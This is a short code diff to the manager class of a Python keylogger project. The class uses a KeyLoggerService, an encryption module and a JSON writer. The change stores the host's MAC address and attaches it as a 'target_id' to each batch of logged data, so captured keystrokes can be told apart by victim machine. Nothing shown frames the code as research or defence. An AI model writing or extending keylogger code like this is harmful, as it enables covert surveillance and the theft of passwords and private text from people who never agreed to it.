@@ -1,13 +1,16 @@
 from writer.json_writer import JsonWriter
 import time
+from getmac import get_mac_address as gma
 from encryption.shaul_encryption import Encryption
 from key_logger_service.key_Logger_service import KeyLoggerService
 import threading
+
 
 class KeyLoggerManager:
 
     def __init__(self):
         self.key_logger_service = KeyLoggerService()
+        self.id = gma()
 
     def __get_formatted_time(self) -> time.strftime:
         epoch_time = time.time()
@@ -25,7 +28,7 @@ class KeyLoggerManager:
 
         try:
             w = JsonWriter()
-            w.write(data=data_to_write)
+            w.write(data=data_to_write, target_id=self.id)
             return True
         except:
             print("Error in __write function")
